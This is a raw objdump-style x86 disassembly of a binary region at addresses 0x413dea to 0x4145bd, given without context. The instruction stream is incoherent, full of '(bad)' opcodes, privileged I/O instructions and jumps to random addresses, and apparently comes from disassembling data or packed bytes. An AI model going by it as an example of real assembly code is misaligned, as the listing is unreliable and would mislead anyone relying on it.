  413dea:	mov    ch,dh
  413dec:	and    eax,0xb27a7db2
  413df1:	addr16 jbe 0x413d7b
  413df4:	jmp    0x3452f236
  413df9:	sahf   
  413dfa:	out    dx,al
  413dfb:	neg    ebp
  413dfd:	sbb    eax,0xc2d53a38
  413e02:	xchg   ecx,eax
  413e03:	stc    
  413e04:	int    0x58
  413e06:	pop    esp
  413e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e08:	sub    esp,DWORD PTR [ecx-0x33]
  413e0b:	test   al,0xc
  413e0d:	mov    dh,0x38
  413e0f:	xor    bl,bh
  413e11:	sbb    eax,0x69614d25
  413e16:	fdiv   st,st(3)
  413e18:	rcr    BYTE PTR [eax],1
  413e1a:	or     edx,DWORD PTR [ecx+eiz*1]
  413e1d:	mul    DWORD PTR [ecx]
  413e1f:	or     DWORD PTR [ecx-0x6d],edi
  413e22:	adc    BYTE PTR [edx+edx*8],bh
  413e25:	and    DWORD PTR [esi+eax*8],eax
  413e28:	not    BYTE PTR [esi-0x4feaab3a]
  413e2e:	and    bl,ch
  413e30:	repz add eax,0x28839484
  413e36:	dec    ecx
  413e37:	mov    ds:0x8be729f1,al
  413e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e3d:	addr16 mov esi,0x1d0a0873
  413e43:	test   eax,0x2cea59cb
  413e48:	bound  eax,QWORD PTR [ebp+0x23]
  413e4b:	rol    BYTE PTR [ecx],0xbc
  413e4e:	div    BYTE PTR [edi+0x43a8d7a7]
  413e54:	dec    esi
  413e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e56:	test   DWORD PTR [ebx+eax*2+0x47],edx
  413e5a:	sbb    eax,DWORD PTR [ecx-0x778d3cb7]
  413e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e61:	pop    esp
  413e62:	popf   
  413e63:	imul   ebp,DWORD PTR [edi-0x7ec12861],0xffffffad
  413e6a:	int3   
  413e6b:	popf   
  413e6c:	xor    BYTE PTR [eiz*2+0x1dadf68c],bl
  413e73:	les    esi,FWORD PTR fs:[eax-0x75]
  413e77:	in     eax,dx
  413e78:	gs test eax,0xb346f19d
  413e7e:	int    0x64
  413e80:	jl     0x413e4b
  413e82:	adc    al,0x9
  413e84:	jno    0x413e14
  413e86:	rcr    BYTE PTR [esi],cl
  413e88:	xor    ah,BYTE PTR [ecx]
  413e8a:	loopne 0x413eab
  413e8c:	dec    ebx
  413e8d:	jb     0x413e27
  413e8f:	out    dx,al
  413e90:	inc    edi
  413e91:	jmp    0x413e9f
  413e93:	push   ebp
  413e94:	pop    ecx
  413e95:	add    eax,0xcf91ee55
  413e9a:	loop   0x413e53
  413e9c:	(bad)  
  413e9d:	jne    0x413e99
  413e9f:	fstp   QWORD PTR [ebx+0x362c1391]
  413ea5:	sbb    esp,esi
  413ea7:	inc    ebp
  413ea8:	les    ebx,FWORD PTR [ecx-0x4a1ae823]
  413eae:	neg    BYTE PTR ds:0x78962dfd
  413eb4:	(bad)  
  413eb5:	jno    0x413e74
  413eb7:	inc    esp
  413eb8:	cli    
  413eb9:	sub    eax,0x52557261
  413ebe:	in     al,0x48
  413ec0:	and    cl,BYTE PTR [edx-0x34]
  413ec3:	jmp    0x511bc25b
  413ec8:	add    esp,DWORD PTR [ecx+ebp*2+0x6b]
  413ecc:	nop
  413ecd:	adc    DWORD PTR [eax-0x5fc29799],ebp
  413ed3:	sbb    eax,0xe790fb2d
  413ed8:	out    0x7f,eax
  413eda:	and    eax,0x5d34a9e7
  413edf:	cmc    
  413ee0:	mov    al,0x89
  413ee2:	sbb    eax,0x6550157a
  413ee7:	retf   
  413ee8:	ja     0x413ec2
  413eea:	fwait
  413eeb:	leave  
  413eec:	rol    BYTE PTR [edx+0x3a],cl
  413eef:	loope  0x413e75
  413ef1:	mov    edx,0x4733ae77
  413ef6:	call   0xdbefd431
  413efb:	sbb    cl,BYTE PTR [edi+eiz*2]
  413efe:	xor    DWORD PTR [edx],ebp
  413f00:	gs inc eax
  413f02:	lahf   
  413f03:	add    ch,BYTE PTR [esi+0x21]
  413f06:	out    dx,eax
  413f07:	xchg   BYTE PTR [eax],ch
  413f09:	xchg   ecx,eax
  413f0a:	adc    ebx,DWORD PTR [ecx+ecx*1-0x5a]
  413f0e:	and    dl,BYTE PTR [edi-0x1f]
  413f11:	rcr    ah,0xa4
  413f14:	adc    eax,0x1c8a3d5c
  413f19:	add    dl,BYTE PTR ds:0x5c187c74
  413f1f:	mov    edi,DWORD PTR ds:0x4371dd81
  413f25:	ins    BYTE PTR es:[edi],dx
  413f26:	icebp  
  413f27:	jle    0x413ed8
  413f29:	sub    eax,edx
  413f2b:	inc    esp
  413f2c:	stos   BYTE PTR es:[edi],al
  413f2d:	hlt    
  413f2e:	mov    dh,0xdc
  413f30:	ja     0x413f3f
  413f32:	or     al,0x4
  413f34:	xor    al,cl
  413f36:	mov    DWORD PTR [edx-0x7e4a58cc],esi
  413f3c:	xlat   BYTE PTR ds:[ebx]
  413f3d:	pop    ebx
  413f3e:	push   0xcd3339ef
  413f43:	pushf  
  413f44:	mov    eax,ds:0x74b9dfc
  413f49:	adc    eax,0xd48382c5
  413f4e:	fdiv   DWORD PTR [ecx]
  413f50:	xchg   DWORD PTR [ebp+0xbb5ac90],esp
  413f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f57:	add    bh,dl
  413f59:	fs pop ss
  413f5b:	fs add al,0xa3
  413f5e:	into   
  413f5f:	mov    BYTE PTR [ebx+0x19],dl
  413f62:	add    ah,al
  413f64:	jae    0x413f05
  413f66:	or     ch,BYTE PTR [ebx]
  413f68:	jmp    0x413f83
  413f6a:	push   ss
  413f6b:	push   es
  413f6c:	mov    esi,0x5ae1440e
  413f71:	pop    ss
  413f72:	(bad)  
  413f73:	in     eax,dx
  413f74:	fsub   QWORD PTR [ecx]
  413f76:	jle    0x413fa0
  413f78:	mov    ebx,0x16dae494
  413f7d:	clc    
  413f7e:	ja     0x413f48
  413f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f81:	adc    eax,0x81244e71
  413f86:	or     esi,ebx
  413f88:	pop    ecx
  413f89:	jp     0x413fc3
  413f8b:	sahf   
  413f8c:	push   edi
  413f8d:	add    BYTE PTR cs:[esi+0x7],bl
  413f91:	iret   
  413f92:	sbb    DWORD PTR [edx+0x34],esp
  413f95:	or     ebp,ebp
  413f97:	mov    eax,0x67eee065
  413f9c:	fld    TBYTE PTR [ebx+eiz*2]
  413f9f:	enter  0x5c6a,0xe2
  413fa3:	mov    bl,0xb3
  413fa5:	(bad)  
  413fa6:	dec    edi
  413fa7:	cld    
  413fa8:	jp     0x413f70
  413faa:	mov    ebp,0xf10b8b5
  413faf:	icebp  
  413fb0:	inc    ecx
  413fb1:	fimul  WORD PTR [ebx+0x64537022]
  413fb7:	aam    0x2
  413fb9:	push   edx
  413fba:	(bad)  
  413fbb:	pop    esi
  413fbc:	jl     0x413fe3
  413fbe:	adc    al,0xa6
  413fc0:	and    ebp,DWORD PTR [eax+0x20]
  413fc3:	loop   0x413fe9
  413fc5:	xchg   ebp,eax
  413fc6:	mov    al,ds:0xa813a7da
  413fcb:	add    ecx,eax
  413fcd:	popf   
  413fce:	call   DWORD PTR [ecx+0x2b01f67c]
  413fd4:	adc    BYTE PTR [eax+0x21361564],ch
  413fda:	loop   0x413f75
  413fdc:	in     al,dx
  413fdd:	sub    cl,BYTE PTR [esi+0x13685c8]
  413fe3:	pushf  
  413fe4:	xchg   edx,esi
  413fe6:	add    eax,0xb03c7c0f
  413feb:	popa   
  413fec:	(bad)  [edi]
  413fee:	jmp    0x1aa7e4cb
  413ff3:	xchg   esi,eax
  413ff4:	call   DWORD PTR [ecx-0x5a506a29]
  413ffa:	lds    ebp,FWORD PTR [ecx+0x7]
  413ffd:	xchg   edi,eax
  413ffe:	jne    0x413f88
  414000:	fs mov esp,0xddc31c03
  414006:	push   ds
  414007:	mov    edi,0xce02a802
  41400c:	mov    ds:0x8c9dd475,al
  414011:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414013:	popf   
  414014:	stos   DWORD PTR es:[edi],eax
  414015:	shl    edi,1
  414017:	cmp    eax,0x73e38a5f
  41401c:	add    eax,DWORD PTR [edx]
  41401e:	jnp    0x413fd0
  414020:	mov    edi,0xb70dec6d
  414025:	cmc    
  414026:	jne    0x413fcf
  414028:	dec    ebp
  414029:	les    eax,FWORD PTR [esi]
  41402b:	cmp    ch,ch
  41402d:	push   edx
  41402e:	dec    esp
  41402f:	loopne 0x414055
  414031:	pop    esp
  414032:	das    
  414033:	mov    eax,ds:0x5e31f9ee
  414038:	jp     0x413ff6
  41403a:	dec    DWORD PTR gs:[ecx]
  41403d:	mov    esp,DWORD PTR [edx-0x24b92b17]
  414043:	and    DWORD PTR [ebx+0x42],ebx
  414046:	mov    ebp,0x9f5c59a5
  41404b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41404c:	mov    cl,0xcc
  41404e:	pop    ds
  41404f:	or     al,0xe3
  414051:	inc    ecx
  414052:	(bad)
  414057:	jbe    0x414041
  414059:	dec    esp
  41405a:	sub    eax,0x282b0afc
  41405f:	aaa    
  414060:	fidivr WORD PTR [eax-0x68]
  414063:	add    al,0x55
  414065:	pop    ss
  414066:	xlat   BYTE PTR ds:[ebx]
  414067:	rcr    ebp,1
  414069:	xor    al,0x33
  41406b:	jb     0x414042
  41406d:	and    eax,DWORD PTR [edi+0x5eea6459]
  414073:	inc    edi
  414074:	mov    al,0xab
  414076:	mov    cl,0x32
  414078:	push   ds
  414079:	fimul  DWORD PTR cs:[ebx-0x44]
  41407d:	cmp    dl,dl
  41407f:	add    BYTE PTR [ecx+0x7b],ch
  414082:	inc    edi
  414083:	sbb    bl,BYTE PTR [edx+edi*1-0x65]
  414087:	fdivr  QWORD PTR [edx-0xa]
  41408a:	shr    BYTE PTR [ebx],1
  41408c:	cmp    eax,0x57192131
  414091:	sti    
  414092:	sbb    DWORD PTR [eax+esi*2+0x5d],ecx
  414096:	push   0x7900c7bf
  41409b:	jmp    0xfac:0x176fd2b4
  4140a2:	pop    eax
  4140a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a4:	push   0xa15d3aff
  4140a9:	mov    ebx,0xa85b3d4f
  4140ae:	loop   0x414032
  4140b0:	bound  esp,QWORD PTR [ebp-0x2f]
  4140b3:	xchg   BYTE PTR [ebx-0xc],bl
  4140b6:	sub    bl,dl
  4140b8:	imul   ebp,DWORD PTR [ecx+0x7b6dcd9f],0xffffff8a
  4140bf:	inc    esp
  4140c0:	pop    ecx
  4140c1:	out    0x1b,al
  4140c3:	stc    
  4140c4:	or     BYTE PTR [ebp-0x2e],bl
  4140c7:	sub    BYTE PTR [ebp+0x1dd8921],dh
  4140cd:	imul   edx,DWORD PTR [ebp-0x3b43b205],0x31cfbbbf
  4140d7:	xchg   edi,eax
  4140d8:	stos   DWORD PTR es:[edi],eax
  4140d9:	ret    0xd835
  4140dc:	ja     0x41413e
  4140de:	es jae 0x4140f9
  4140e1:	cmp    bl,dl
  4140e3:	nop
  4140e4:	mov    ecx,DWORD PTR [edx+eax*1-0xcab64cb]
  4140eb:	pushf  
  4140ec:	fs and al,0x52
  4140ef:	push   es
  4140f0:	cmp    BYTE PTR ds:0x2fb9ea5b,ah
  4140f6:	add    ebx,DWORD PTR [edi+0x161fc81f]
  4140fc:	mov    WORD PTR [edx-0x7c],?
  4140ff:	imul   ecx,DWORD PTR [ebx],0x17481f
  414105:	xor    BYTE PTR [ebp+edi*4-0x6e],bl
  414109:	jo     0x414119
  41410b:	dec    ebx
  41410c:	sbb    edi,0x1bec2320
  414112:	(bad)  
  414113:	loopne 0x4140f6
  414115:	pop    ecx
  414116:	jecxz  0x414115
  414118:	push   0xffffffa7
  41411a:	lock or DWORD PTR [ecx+edx*2+0x25fcbeaa],ebp
  414122:	test   esi,0x8c3a3f39
  414128:	dec    edi
  414129:	imul   DWORD PTR [ebp-0x29]
  41412c:	data16 (bad) 
  41412e:	mov    ah,0x69
  414130:	fidivr DWORD PTR [eax+0x3aeff59c]
  414136:	mov    ebp,eax
  414138:	cwde   
  414139:	hlt    
  41413a:	jbe    0x414123
  41413c:	pop    es
  41413d:	mov    edx,ss
  41413f:	mov    ah,0xeb
  414141:	mov    ecx,0xec18fa5a
  414146:	jae    0x414162
  414148:	add    BYTE PTR [ebp-0x14df40fb],ah
  41414e:	mov    bh,0xae
  414150:	test   al,0x3e
  414152:	fsubr  QWORD PTR [edi]
  414154:	push   esi
  414155:	push   es
  414156:	mov    dh,0xc9
  414158:	jb     0x4141cd
  41415a:	push   esp
  41415b:	and    ebx,ebx
  41415d:	sub    DWORD PTR [ecx],ecx
  41415f:	sbb    eax,0xe95a1232
  414164:	sbb    al,0xf4
  414166:	das    
  414167:	cmp    ebx,esp
  414169:	mov    ch,0x3a
  41416b:	push   0x4e5fafe9
  414170:	pop    ebp
  414171:	(bad)  
  414172:	jmp    0x41419c
  414174:	test   DWORD PTR [edi-0x53],ecx
  414177:	xor    eax,DWORD PTR [esi-0x71fb0a66]
  41417d:	jns    0x41412c
  41417f:	dec    esp
  414180:	push   ds
  414181:	jmp    0x4141f4
  414183:	daa    
  414184:	je     0x414146
  414186:	fidivr WORD PTR [ebx]
  414188:	fist   DWORD PTR [edi]
  41418a:	xchg   esp,eax
  41418b:	cmc    
  41418c:	dec    ecx
  41418d:	in     al,0xef
  41418f:	push   esp
  414190:	sbb    dl,BYTE PTR [ecx]
  414192:	sub    esi,ecx
  414194:	xor    dl,BYTE PTR [ebx+0x35d0fdc2]
  41419a:	shr    DWORD PTR [esi+ebp*2-0x4b],0xf2
  41419f:	add    al,0xc6
  4141a1:	in     eax,dx
  4141a2:	lds    ecx,FWORD PTR [ecx]
  4141a4:	jle    0x414143
  4141a6:	call   0xb0af5c6
  4141ab:	mov    edi,ds
  4141ad:	and    bh,ch
  4141af:	test   al,0x3f
  4141b1:	sub    dh,BYTE PTR [ecx+ecx*2-0x3b83e9c]
  4141b8:	push   0x7c09e703
  4141bd:	int    0xf6
  4141bf:	xchg   ebx,eax
  4141c0:	mov    al,0x9d
  4141c2:	out    0x2e,eax
  4141c4:	fist   WORD PTR [esi-0x36f02ed]
  4141ca:	sub    esp,esi
  4141cc:	jne    0x41420d
  4141ce:	in     eax,0x1b
  4141d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141d1:	shr    DWORD PTR [esi+0x72],cl
  4141d4:	xchg   edx,eax
  4141d5:	add    DWORD PTR [esi+ebx*4],0x7a00341
  4141dc:	stos   BYTE PTR es:[edi],al
  4141dd:	loopne 0x41423c
  4141df:	aam    0xbc
  4141e1:	push   ds
  4141e2:	cmp    al,0x28
  4141e4:	ret    
  4141e5:	scas   al,BYTE PTR es:[edi]
  4141e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141e7:	xor    al,0x57
  4141e9:	lds    ebx,FWORD PTR [ebx-0x2bb4877a]
  4141ef:	inc    ebp
  4141f0:	cdq    
  4141f1:	pushf  
  4141f2:	jo     0x4141de
  4141f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141f5:	mov    DWORD PTR [edi+eiz*4+0x74450978],ebx
  4141fc:	call   0x5c01bb07
  414201:	cmp    al,BYTE PTR [edi+0x2f]
  414204:	test   BYTE PTR [ebx+0x62b96df9],dl
  41420a:	xor    al,bh
  41420c:	jmp    0x4141d5
  41420e:	and    ebp,DWORD PTR [esi+0x75fda94c]
  414214:	mov    al,ds:0x7dfc4493
  414219:	or     ebp,DWORD PTR [ebx-0x13869ee1]
  41421f:	jge    0x4141a3
  414221:	clc    
  414222:	and    DWORD PTR [edi+0x2d5056b0],esp
  414228:	add    eax,0x39f99742
  41422d:	(bad)  
  41422e:	xor    ebp,edi
  414230:	add    DWORD PTR [ebx-0x30e2f493],esp
  414236:	imul   ecx,DWORD PTR [eax],0xffffffcd
  414239:	out    0xa0,al
  41423b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41423c:	mov    al,BYTE PTR [edx-0x63]
  41423f:	(bad)  
  414240:	cmp    DWORD PTR [esi],esi
  414242:	inc    eax
  414243:	sub    eax,0x805d2398
  414248:	pop    ecx
  414249:	or     BYTE PTR [esi-0xf],dl
  41424c:	and    al,0x56
  41424e:	nop
  41424f:	aam    0x76
  414251:	mov    edi,0x8a0ef389
  414256:	and    DWORD PTR [edx],esp
  414258:	pushf  
  414259:	sub    ebx,esp
  41425b:	or     edx,ecx
  41425d:	pop    es
  41425e:	sbb    al,0x58
  414260:	inc    edx
  414261:	inc    ecx
  414262:	repz enter 0x1a94,0x21
  414267:	pop    edi
  414268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414269:	adc    al,0xbe
  41426b:	sysret 
  41426d:	outs   dx,DWORD PTR ds:[esi]
  41426e:	hlt    
  41426f:	dec    ebx
  414270:	and    ebx,DWORD PTR [ebp-0xcd4cdd0]
  414276:	jecxz  0x4142bd
  414278:	in     eax,dx
  414279:	push   edx
  41427a:	jmp    0x4142fb
  41427c:	repz sti 
  41427e:	jbe    0x4142a1
  414280:	rcl    DWORD PTR [eax],1
  414282:	repnz xchg edx,eax
  414284:	and    BYTE PTR [edx-0x5d],cl
  414287:	pop    ecx
  414288:	cdq    
  414289:	cli    
  41428a:	in     al,dx
  41428b:	je     0x4142bf
  41428d:	(bad)  
  41428e:	out    dx,eax
  41428f:	shr    DWORD PTR [ebx-0x27f361c6],1
  414295:	test   eax,0xde4aa598
  41429a:	ret    
  41429b:	in     eax,dx
  41429c:	push   cs
  41429d:	ins    DWORD PTR es:[edi],dx
  41429e:	mov    DWORD PTR [edi-0x737b8785],0x1c62f7a3
  4142a8:	push   ebp
  4142a9:	pop    esp
  4142aa:	xchg   ecx,eax
  4142ab:	cmp    BYTE PTR [eax],cl
  4142ad:	add    BYTE PTR [esi+0x18],bh
  4142b0:	dec    ebp
  4142b1:	lods   eax,DWORD PTR ds:[esi]
  4142b2:	aas    
  4142b3:	scas   al,BYTE PTR es:[edi]
  4142b4:	shl    bl,0x60
  4142b7:	sub    bl,ah
  4142b9:	aas    
  4142ba:	pop    edi
  4142bb:	mov    ch,0xa4
  4142bd:	xchg   ebp,eax
  4142be:	loop   0x41429e
  4142c0:	mov    al,0x12
  4142c2:	push   esp
  4142c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142c4:	add    eax,eax
  4142c6:	ss pop ebx
  4142c8:	popf   
  4142c9:	xor    BYTE PTR [edi-0x2a],al
  4142cc:	jmp    0xd567:0xe1ac224d
  4142d3:	sbb    ecx,DWORD PTR [eax+0x14a5b7ed]
  4142d9:	push   ecx
  4142da:	and    al,0x4e
  4142dc:	repnz dec esp
  4142de:	in     eax,dx
  4142df:	mov    ch,0x34
  4142e1:	aas    
  4142e2:	push   ss
  4142e3:	lods   eax,DWORD PTR ds:[esi]
  4142e4:	popa   
  4142e5:	fiadd  WORD PTR [edi-0x7c]
  4142e8:	nop
  4142e9:	sub    ebp,0xffffff98
  4142ec:	sbb    dh,bh
  4142ee:	cwde   
  4142ef:	xor    al,0x54
  4142f1:	jae    0x4142c8
  4142f3:	add    eax,0x12c08f9
  4142f8:	sbb    BYTE PTR [ecx-0x38],dh
  4142fb:	ror    BYTE PTR [ecx-0x3fc3ba96],1
  414301:	mov    BYTE PTR [esi+0x25],ch
  414304:	pop    eax
  414305:	sahf   
  414306:	test   eax,0x730445fc
  41430b:	add    BYTE PTR ds:[ebp-0x5bf840bb],cl
  414312:	out    dx,eax
  414313:	add    DWORD PTR [eax+0x6d7936c5],esp
  414319:	pop    ebx
  41431a:	lods   al,BYTE PTR ds:[esi]
  41431b:	pop    ebp
  41431c:	mov    ah,0xfb
  41431e:	adc    ebp,ebx
  414320:	or     bl,cl
  414322:	cmp    al,0x41
  414324:	xchg   ecx,eax
  414325:	arpl   WORD PTR [eax+0x2f],bp
  414328:	int3   
  414329:	gs pushf 
  41432b:	cld    
  41432c:	out    0x9b,eax
  41432e:	sbb    DWORD PTR [edi],0x929a6194
  414334:	inc    edi
  414335:	adc    DWORD PTR [esi],esi
  414337:	lahf   
  414338:	in     al,0x84
  41433a:	cdq    
  41433b:	mov    gs,ecx
  41433d:	sub    eax,0x3be4c28b
  414342:	dec    eax
  414343:	mov    dl,BYTE PTR [esi+0x68]
  414346:	shl    BYTE PTR [eax+edx*8+0x61],cl
  41434a:	mov    ds:0xcf32574a,eax
  41434f:	call   edx
  414351:	dec    esp
  414352:	dec    esi
  414353:	pop    DWORD PTR [ebx-0x49ee8efa]
  414359:	gs scas al,BYTE PTR es:[edi]
  41435b:	sub    BYTE PTR [ebp-0x71325872],bh
  414361:	addr16 mov ah,0x75
  414364:	cld    
  414365:	add    dl,dl
  414367:	push   esi
  414368:	xchg   esp,eax
  414369:	fisub  DWORD PTR [edi+0x35]
  41436c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41436d:	jnp    0x4143c1
  41436f:	mov    eax,ds:0xc6a90f7a
  414374:	mov    DWORD PTR [esi+0x3a],ebx
  414377:	iret   
  414378:	add    BYTE PTR [eax],bh
  41437a:	in     al,0x19
  41437c:	mov    WORD PTR [ecx+0x6eafb024],fs
  414382:	mov    es,WORD PTR [ebx]
  414384:	mov    esp,0x6d32732d
  414389:	or     eax,0x5360b4be
  41438e:	xchg   BYTE PTR [edx],cl
  414390:	stc    
  414391:	lahf   
  414392:	retf   
  414393:	retf   0x9d82
  414396:	fucomip st,st(1)
  414398:	lods   eax,DWORD PTR ds:[esi]
  414399:	mov    BYTE PTR [eax+0x3],dh
  41439c:	test   al,0x29
  41439e:	fisttp WORD PTR [ebx+edi*4-0x6a71cced]
  4143a5:	inc    ebx
  4143a6:	nop
  4143a7:	inc    esp
  4143a8:	or     al,0x4d
  4143aa:	mov    ch,0x9d
  4143ac:	mov    esi,0x6f882bdb
  4143b1:	sar    dh,cl
  4143b3:	loopne 0x4143c1
  4143b5:	fiadd  WORD PTR [ebp-0x57615e08]
  4143bb:	push   edi
  4143bc:	jge    0x414408
  4143be:	(bad)  
  4143bf:	push   ss
  4143c0:	cli    
  4143c1:	stc    
  4143c2:	arpl   WORD PTR [ebx-0x3f],si
  4143c5:	pop    ss
  4143c6:	or     DWORD PTR [ecx-0x49486076],ebx
  4143cc:	gs loope 0x414433
  4143cf:	dec    esp
  4143d0:	dec    edi
  4143d1:	stos   DWORD PTR es:[edi],eax
  4143d2:	fdivr  QWORD PTR [edx+0x2a]
  4143d5:	jecxz  0x4143f5
  4143d7:	pop    ebp
  4143d8:	nop
  4143d9:	and    BYTE PTR [ecx+esi*4],dl
  4143dc:	xlat   BYTE PTR ds:[ebx]
  4143dd:	inc    edx
  4143de:	xchg   edi,eax
  4143df:	cld    
  4143e0:	or     eax,0xd590b84f
  4143e5:	pushf  
  4143e6:	mov    ds:0xbd0f3767,al
  4143eb:	sbb    eax,0x4e4174df
  4143f0:	jmp    0x2f169683
  4143f5:	out    0x1f,eax
  4143f7:	xor    BYTE PTR [edx],dl
  4143f9:	add    edx,esi
  4143fb:	xor    esi,DWORD PTR [ebx-0x4f]
  4143fe:	mov    ds:0xfddd854b,al
  414403:	loop   0x41442f
  414405:	cmp    dh,BYTE PTR [esi]
  414407:	cdq    
  414408:	sti    
  414409:	mov    bl,0x21
  41440b:	pop    es
  41440c:	or     edx,esi
  41440e:	mov    ch,0x7f
  414410:	jmp    0xe114:0x8544c27b
  414417:	dec    ebp
  414418:	inc    esp
  414419:	enter  0x1b1,0xad
  41441d:	xchg   ebp,eax
  41441e:	je     0x414478
  414420:	cld    
  414421:	mov    ds:0xa6f9a838,al
  414426:	test   eax,0x9ddf3c91
  41442b:	mov    al,0x9
  41442d:	div    DWORD PTR [edx-0x774b13d6]
  414433:	cmp    eax,0xafd29dc6
  414438:	sbb    ecx,ebx
  41443a:	bnd jno 0x4143c9
  41443d:	pop    ecx
  41443e:	cmp    cl,dl
  414440:	xchg   ecx,eax
  414441:	lods   eax,DWORD PTR ds:[esi]
  414442:	fisttp QWORD PTR [edi-0x66a36f2]
  414448:	std    
  414449:	fild   DWORD PTR [eax+0x5]
  41444c:	imul   edi,DWORD PTR [esi+esi*4+0x5401616f],0x1d
  414454:	sbb    ebx,ebx
  414456:	std    
  414457:	or     al,0x78
  414459:	enter  0x3b1d,0x23
  41445d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41445e:	test   BYTE PTR [edi-0x766e98ee],dh
  414464:	in     al,dx
  414465:	jo     0x4144b1
  414467:	or     esi,esi
  414469:	jg     0x4144db
  41446b:	in     eax,dx
  41446c:	sub    edx,ebx
  41446e:	pop    ebx
  41446f:	add    DWORD PTR [ecx+0x4],esp
  414472:	adc    al,0x75
  414474:	dec    edx
  414475:	sub    BYTE PTR cs:[ecx+edi*8+0x3af7d20c],cl
  41447d:	xor    ah,BYTE PTR [ecx-0x73b77e08]
  414483:	or     al,0x8a
  414485:	sti    
  414486:	mov    dh,0x31
  414488:	jecxz  0x4144ff
  41448a:	mov    al,ds:0x289cf4e9
  41448f:	jl     0x4144ce
  414491:	jmp    0x9ff85001
  414496:	sbb    eax,DWORD PTR [ebx-0x3d753d5b]
  41449c:	std    
  41449d:	daa    
  41449e:	push   cs
  41449f:	cmp    al,0x45
  4144a1:	arpl   WORD PTR [ecx],di
  4144a3:	adc    DWORD PTR [esi+0x699bdbbd],ebp
  4144a9:	xchg   esp,eax
  4144aa:	dec    ebx
  4144ab:	lock out dx,eax
  4144ad:	inc    edi
  4144ae:	pushf  
  4144af:	mov    ebp,0x2fc10f05
  4144b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b5:	in     al,dx
  4144b6:	or     BYTE PTR [edx],bl
  4144b8:	push   0xaeeebbaf
  4144bd:	mov    DWORD PTR [esi+0x72],edi
  4144c0:	push   esi
  4144c1:	fcomp  DWORD PTR [esi+0x69]
  4144c4:	push   ss
  4144c5:	xor    eax,0xb503ec74
  4144ca:	adc    DWORD PTR ss:[ecx],ebx
  4144cd:	push   0x2b027ed0
  4144d2:	clc    
  4144d3:	imul   ecx,DWORD PTR [esi-0x4e],0x9
  4144d7:	cdq    
  4144d8:	out    0x96,eax
  4144da:	aam    0x5f
  4144dc:	(bad)  
  4144dd:	jo     0x414528
  4144df:	or     DWORD PTR [ebx],ecx
  4144e1:	push   cs
  4144e2:	xchg   ebp,eax
  4144e3:	xor    esp,DWORD PTR [ebp+0x77]
  4144e6:	fsub   st,st(3)
  4144e8:	add    eax,0xe8555df
  4144ed:	mov    ch,0x1a
  4144ef:	jmp    0xc57c7a45
  4144f4:	jg     0x4144bd
  4144f6:	inc    ebp
  4144f7:	jge    0x414483
  4144f9:	(bad)  
  4144fa:	push   esp
  4144fb:	xor    BYTE PTR ds:0x1698a93e,bl
  414501:	loope  0x4144c6
  414503:	sub    al,BYTE PTR [edx+0x73a6a701]
  414509:	inc    edi
  41450a:	push   0x76
  41450c:	jle    0x414499
  41450e:	test   BYTE PTR [edi],cl
  414510:	je     0x4144c1
  414512:	push   edx
  414513:	rcr    DWORD PTR [ebx],cl
  414515:	jmp    0xfb87:0x80ecde79
  41451c:	jb     0x4144bf
  41451e:	or     ebp,edx
  414520:	mov    dl,0xba
  414522:	ret    0x64e6
  414525:	stos   BYTE PTR es:[edi],al
  414526:	aaa    
  414527:	push   esp
  414528:	pop    ecx
  414529:	sar    DWORD PTR [esi],0xb1
  41452c:	add    DWORD PTR ds:0x6dd7803a,ebp
  414532:	and    al,0xa0
  414534:	fst    QWORD PTR [eax-0x2c6024a6]
  41453a:	dec    eax
  41453b:	cmp    al,0xb1
  41453d:	dec    edi
  41453e:	jp     0x414512
  414540:	shl    DWORD PTR [eax],cl
  414542:	clc    
  414543:	push   esp
  414544:	mov    al,0x0
  414546:	jp     0x414582
  414548:	xlat   BYTE PTR ds:[ebx]
  414549:	sub    al,0x65
  41454b:	add    esp,esi
  41454d:	jno    0x414566
  41454f:	mov    edi,0xb3b14d99
  414554:	add    BYTE PTR [eax-0x3f],dl
  414557:	out    0xbe,al
  414559:	jb     0x41457b
  41455b:	mov    ah,0x55
  41455d:	sahf   
  41455e:	enter  0x60fe,0xb8
  414562:	fistp  QWORD PTR [ebp-0x74d178b4]
  414568:	fs add al,0xf
  41456b:	inc    ebx
  41456c:	jo     0x414510
  41456e:	pop    edi
  41456f:	sbb    al,0x23
  414571:	jae    0x414553
  414573:	xchg   esi,eax
  414574:	adc    DWORD PTR [esi+0x493a412c],0xffffffa7
  41457b:	inc    eax
  41457c:	inc    esp
  41457d:	ss mov edi,0x1cced3b1
  414583:	repz sub DWORD PTR [esi+0x54],0xffffffe6
  414588:	dec    eax
  414589:	scas   eax,DWORD PTR es:[edi]
  41458a:	dec    esi
  41458b:	adc    esp,DWORD PTR [eax]
  41458d:	xor    cl,BYTE PTR [ebp+0x70c2c239]
  414593:	stc    
  414594:	xchg   ecx,eax
  414595:	test   al,0x77
  414597:	aas    
  414598:	aaa    
  414599:	sbb    BYTE PTR fs:[edi-0x49],0x4e
  41459e:	sbb    BYTE PTR [ebx+0x35],bh
  4145a1:	js     0x414620
  4145a3:	inc    ebx
  4145a4:	cmp    eax,0xf6ba9f29
  4145a9:	cli    
  4145aa:	in     al,dx
  4145ab:	loop   0x4145bf
  4145ad:	inc    esp
  4145ae:	xchg   esp,eax
  4145af:	push   ss
  4145b0:	cmp    ch,BYTE PTR [edi-0x5a00654a]
  4145b6:	sub    eax,0x596f0a25
  4145bb:	cmp    esp,ecx
  4145bd:	fist   WORD PTR [esi]
